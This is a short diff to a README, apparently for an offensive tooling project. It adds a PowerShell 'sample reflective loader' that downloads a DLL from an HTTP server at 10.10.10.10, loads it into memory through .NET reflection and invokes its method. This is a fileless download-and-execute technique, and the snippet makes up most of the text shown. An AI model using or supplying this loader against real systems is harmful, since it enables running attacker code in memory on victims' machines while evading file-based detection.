@@ -77,6 +77,15 @@ Compilation succeeded - 2 warning(s)
 
 ```
 
+Sample reflective loader to use with dll
+```PowerShell
+$data = (New-Object System.Net.WebClient).DownloadData('http://10.10.10.10/runner.dll') 
+$assem = [System.Reflection.Assembly]::Load($data) 
+$class = $assem.GetType("ReflectiveLoadDll.Class1") 
+$method = $class.GetMethod("runner") 
+$method.Invoke(0, $null)
+```
+
 ####  To-Dos
  
  * Build Modularity into the tool to :
